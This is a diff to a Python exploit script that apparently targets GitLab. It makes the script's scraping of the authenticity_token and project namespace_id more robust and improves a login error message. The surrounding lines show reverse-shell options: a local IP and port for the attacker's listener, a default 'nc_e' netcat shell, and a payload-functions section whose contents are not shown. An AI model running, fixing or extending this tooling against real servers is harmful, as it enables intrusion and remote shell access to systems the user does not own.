@@ -33,8 +33,8 @@ local_ip = args.l
 local_port = args.P
 shell_lang = ('nc_e' if args.L == None else args.L)
 
-auth_token_regex = re.compile(r'name="authenticity_token" value="(.*)" />')
-namespace_id_regex = re.compile(r'<input value="(.*)" type="hidden" name="project\[namespace_id\]"')
+auth_token_regex = re.compile(r'<input.*?authenticity_token.*?value="(.*)".*/>')
+namespace_id_regex = re.compile(r'<input.*?value="(.*)".*?project\[namespace_id\]')
 
 
 ######## PAYLOAD FUNCTIONS ########
@@ -122,7 +122,7 @@ login_data = {
 login_post = request.post(url_login, data=login_data)
 
 if login_post.status_code != 200:
-    exit(f"[-] Login general error: {url_login}")
+    exit(f"[-] Login general error: {login_post.status_code} {url_login}")
 elif "Invalid Login" in login_post.text:
     exit(f"[-] Login error: {user} / {pwd}")
 
